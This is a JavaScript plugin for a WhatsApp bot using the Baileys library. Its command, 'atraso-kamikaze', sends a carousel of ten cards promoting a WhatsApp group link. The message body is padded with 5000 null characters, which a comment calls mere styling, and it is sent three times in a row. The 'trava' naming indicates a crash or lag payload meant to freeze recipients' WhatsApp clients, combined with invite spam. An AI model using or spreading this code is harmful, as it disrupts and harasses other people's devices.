import { prepareWAMessageMedia, generateMessageID } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const target = m.chat;
  const imagePath = './src/foto.jpg';
  const groupLink = 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE';
  const travaSend = 3; // Cuántas veces repetir el envío

  // Subir imagen y preparar contenido multimedia
  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer });

  // Función para generar tarjetas
  const makeCard = () => ({
    header: {
      ...media.imageMessage,
      title: `\n${groupLink}\n`,
      gifPlayback: true,
      subtitle: " ",
      hasMediaAttachment: false
    },
    body: {
      text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
    },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "Unirme 🚪",
          url: groupLink,
          merchant_url: groupLink
        })
      }]
    }
  });

  // Generar las 10 tarjetas
  const cards = Array.from({ length: 10 }, makeCard);

  // Crear mensaje tipo carrusel visual
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\n" + "\0".repeat(5000) // Cuerpo relleno para estilo
          },
          carouselMessage: { cards }
        }
      }
    }
  };

  // Enviar carrusel N veces (travaSend)
  for (let i = 0; i < travaSend; i++) {
    await conn.relayMessage(target, msg, { messageId: generateMessageID() });
  }
};

handler.command = ['atraso-kamikaze'];
export default handler;